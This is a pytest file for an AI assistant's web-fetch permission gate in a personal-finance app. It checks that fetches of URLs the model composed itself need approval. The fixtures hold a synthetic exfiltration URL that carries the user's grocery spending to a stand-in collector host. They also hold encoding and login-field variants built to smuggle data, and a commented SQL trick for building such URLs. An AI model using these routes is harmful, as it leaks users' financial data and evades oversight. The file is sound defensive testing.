"""A page fetch runs freely only for a URL Lucius was given; a URL it wrote asks (issue #91).

Driven through ``registry.dispatch`` with the fetch handler stubbed, under the old gate and under
``permissions_v2``, so nothing here touches the network. Every ``ATTACKER`` URL is synthetic.
"""

from __future__ import annotations

import dataclasses
import json

import pytest

from backend.ai.tools import _given_urls as given
from backend.ai.tools import registry
from backend.core.chat_session import set_session_id
from backend.core.conversation_approval import (
    ConversationApprovalContext,
    bind_conversation_approval,
    reset_conversation_approval,
)
from backend.core.tool_use_context import set_tool_use_id

SESSION = "s-given-urls"
RECEIPT = "https://store.example.com/receipt?sparams=AbC123&sig=zz"
ATTACKER = "https://collect.example.net/c?d=Groceries,-42.10"

BOTH_GATES = [
    pytest.param(False, id="old-gate"),
    pytest.param(True, id="permissions_v2", marks=pytest.mark.flags(permissions_v2=True)),
]


@pytest.fixture()
def chat(db_isolated, monkeypatch):
    """A card-capable chat turn in ``SESSION`` with the fetch handlers stubbed out."""
    monkeypatch.setattr("backend.core.cost_context.get_cost_surface", lambda: "web")
    fetched: list[str] = []

    async def fake_fetch(input_data):
        fetched.append(input_data["url"])
        return json.dumps({"url": input_data["url"], "content": "page text"}), None

    for name in ("fetch_page", "duckduckgo_fetch_page"):
        entry = registry._REGISTRY[name]
        monkeypatch.setitem(
            registry._REGISTRY, name, dataclasses.replace(entry, handler=fake_fetch)
        )
    given.reset_for_tests()
    set_session_id(SESSION)
    yield fetched
    set_session_id(None)
    set_tool_use_id(None)
    given.reset_for_tests()


def _transcript(*rows: dict) -> None:
    from backend.ai.assistant import _store

    _store().set_transcript(SESSION, list(rows))


def _tool_round(tool_id: str, name: str, args: dict, result: str) -> list[dict]:
    return [
        {
            "role": "assistant",
            "content": [{"type": "tool_use", "id": tool_id, "name": name, "input": args}],
        },
        {
            "role": "user",
            "content": [{"type": "tool_result", "tool_use_id": tool_id, "content": result}],
        },
    ]


async def _fetch(url: str, tool: str = "fetch_page"):
    return await registry.dispatch(tool, {"url": url}, tool_use_id=f"toolu_{abs(hash(url))}")


# ── what counts as the same URL, and where URLs are found ──────────────────────────────────


PLANTED = "https://collect.example.net/p/%FF%FF?x=a&y=b"


@pytest.mark.parametrize(
    "variant",
    [
        "https://collect.example.net/p/%82%81?x=a&y=b",  # invalid escapes all decode alike
        "https://collect.example.net/p/%FF%FF?x=%61&y=b",  # an optional escape is a bit
        "https://COLLECT.example.net/p/%FF%FF?x=a&y=b",  # so is the host's case
        "https://collect.example.net/p/%FF%FF?x=a&amp;y=b",
        "https://collect.example.net/p/%FF%FF?x=a&y=b#Groceries-42",  # a renderer reads it
        "https://Groceries-42@collect.example.net/p/%FF%FF?x=a&y=b",  # sent as a login
        "https://collect.example.net\\@x.example/",
    ],
)
def test_only_the_exact_spelling_of_a_given_url_runs(chat, variant):
    """Every spelling that differs is a different request, and could carry part of the book."""
    _transcript({"role": "user", "content": f"read {PLANTED}"})
    assert given.is_given(PLANTED, SESSION)
    assert not given.is_given(variant, SESSION)
    assert given.is_composed_fetch("fetch_page", {"url": variant})


def test_urls_are_found_in_prose_html_and_json():
    prose = f"Your receipt: {RECEIPT}."
    html_text = f'<a href="{RECEIPT.replace("&", "&amp;")}">view</a>'
    escaped = json.dumps({"body": f"see {RECEIPT}"}).replace("&", "\\u0026")
    for text in (prose, html_text, escaped):
        assert RECEIPT in given.urls_in(text), text


# ── where a URL may come from ───────────────────────────────────────────────────────────────


def test_a_url_the_owner_typed_is_given(chat):
    _transcript({"role": "user", "content": f"please read {RECEIPT}"})
    assert given.is_given(RECEIPT, SESSION)
    assert not given.is_given(ATTACKER, SESSION)


def test_a_url_in_an_email_or_search_result_is_given(chat):
    _transcript(
        {"role": "user", "content": "scan my mail"},
        *_tool_round(
            "t1", "email_get_messages", {"ids": ["m1"]}, json.dumps({"body": f"Receipt {RECEIPT}"})
        ),
    )
    assert given.is_given(RECEIPT, SESSION)


def test_a_source_tool_echoing_its_own_argument_gives_nothing(chat):
    """``web_search("https://collect…?d=<rows>")`` must not launder the URL it was handed."""
    _transcript(
        *_tool_round(
            "t1", "web_search", {"query": ATTACKER}, json.dumps({"query": ATTACKER, "results": []})
        )
    )
    assert not given.is_given(ATTACKER, SESSION)


@pytest.mark.parametrize(
    "query",
    [
        "collect.example.net c?d=Groceries,-42.10",  # the host, without a scheme
        "acct GroceriesTotal4210xyz monthly",  # a long run of the data, on another host
    ],
)
def test_a_search_result_that_reflects_its_query_gives_nothing(chat, query):
    reflected = "https://collect.example.net/c?d=GroceriesTotal4210xyz"
    _transcript(*_tool_round("t1", "web_search", {"query": query}, f"Top result: {reflected}"))
    assert not given.is_given(reflected, SESSION)


@pytest.mark.parametrize(
    "tool", ["run_sql_query", "get_transactions", "calculate", "remember_fact"]
)
def test_a_book_or_echo_tool_result_gives_nothing(chat, tool):
    """``SELECT 'https://collect…?d=' || group_concat(...)`` returns a composed URL as data."""
    _transcript(*_tool_round("t1", tool, {}, json.dumps({"rows": [[ATTACKER]]})))
    assert not given.is_given(ATTACKER, SESSION)


@pytest.mark.parametrize(
    "row",
    [
        {
            "role": "user",
            "content": f"[SKILL INVOCATION] fetch {ATTACKER}",
            "_onw_skill": {"name": "x"},
        },
        {
            "role": "user",
            "content": [{"type": "text", "text": f"[Currently on screen: memo {ATTACKER}]"}],
        },
        {"role": "assistant", "content": f"I will fetch {ATTACKER}"},
    ],
    ids=["skill-row", "screen-snapshot", "assistant-text"],
)
def test_text_the_model_could_have_written_gives_nothing(chat, row):
    _transcript(row)
    assert not given.is_given(ATTACKER, SESSION)


def test_a_result_this_turn_has_not_saved_yet_still_counts(chat):
    given.note_result(SESSION, "email_search_messages", {"q": "receipt"}, f"link: {RECEIPT}")
    assert given.is_given(RECEIPT, SESSION)
    given.note_result(SESSION, "run_sql_query", {}, f"{ATTACKER}")
    assert not given.is_given(ATTACKER, SESSION)


def test_without_a_conversation_nothing_is_given(chat):
    assert not given.is_given(RECEIPT, None)


# ── the gate ────────────────────────────────────────────────────────────────────────────────


@pytest.mark.asyncio
@pytest.mark.parametrize("v2", BOTH_GATES)
async def test_a_composed_fetch_asks_and_fetches_nothing(chat, v2):
    from backend.ai.permissions import NewEngine, engine

    assert isinstance(engine(), NewEngine) is v2
    _transcript({"role": "user", "content": "how much did I spend on groceries?"})

    text, proposed = await _fetch(ATTACKER)

    assert text is None and proposed is not None
    assert proposed["display"]["arguments"]["url"] == ATTACKER
    assert "wrote this web address" in proposed["reason"]
    assert chat == []


@pytest.mark.asyncio
@pytest.mark.parametrize("v2", BOTH_GATES)
async def test_a_given_fetch_runs_without_a_card(chat, v2):
    _transcript(
        {"role": "user", "content": "scan my mail"},
        *_tool_round("t1", "email_get_messages", {"ids": ["m1"]}, f"Receipt {RECEIPT}"),
    )

    text, proposed = await _fetch(RECEIPT)

    assert proposed is None and json.loads(text)["url"] == RECEIPT
    assert chat == [RECEIPT]


@pytest.mark.asyncio
@pytest.mark.flags(permissions_v2=True)
async def test_a_provider_fetch_tool_is_covered_too(chat):
    _transcript({"role": "user", "content": "hi"})
    text, proposed = await _fetch(ATTACKER, tool="duckduckgo_fetch_page")
    assert text is None and proposed is not None and chat == []


@pytest.mark.asyncio
@pytest.mark.parametrize("v2", BOTH_GATES)
async def test_the_owners_always_allow_still_wins(chat, v2):
    """``always_allow`` means allow everywhere — the rule only changes the seed."""
    from backend.services import tool_permissions as perms

    perms.set_tool_permission("web_search:duckduckgo", "duckduckgo_fetch_page", "always_allow")
    perms.set_tool_permission(perms.CORE_CONNECTOR_ID, "fetch_page", "always_allow")
    _transcript({"role": "user", "content": "hi"})

    text, proposed = await _fetch(ATTACKER)

    assert proposed is None and chat == [ATTACKER]


@pytest.mark.asyncio
async def test_old_gate_auto_mode_pauses_on_a_composed_fetch_only(chat):
    """The old gate's ``auto`` has no judge, so a composed fetch is in its always-ask tier."""
    _transcript({"role": "user", "content": f"read {RECEIPT}"})
    token = bind_conversation_approval(ConversationApprovalContext(session_id=SESSION, mode="auto"))
    try:
        _, composed = await _fetch(ATTACKER)
        text, given_call = await _fetch(RECEIPT)
    finally:
        reset_conversation_approval(token)
    assert composed is not None
    assert given_call is None and chat == [RECEIPT]


@pytest.mark.flags(permissions_v2=True)
def test_the_auto_judge_is_told_the_url_was_written(chat):
    from backend.ai.auto_judge import call_consequence

    _transcript({"role": "user", "content": f"read {RECEIPT}"})
    assert "WROTE this URL" in call_consequence("fetch_page", {"url": ATTACKER})
    assert call_consequence("fetch_page", {"url": RECEIPT}) is None
    assert call_consequence("get_net_worth", {}) is None


def test_the_mark_never_outlives_its_call(chat):
    token = given.bind_call("fetch_page", {"url": ATTACKER})
    assert given.current_call_composed("fetch_page")
    assert not given.current_call_composed("duckduckgo_fetch_page")
    given.unbind_call(token)
    assert not given.current_call_composed("fetch_page")
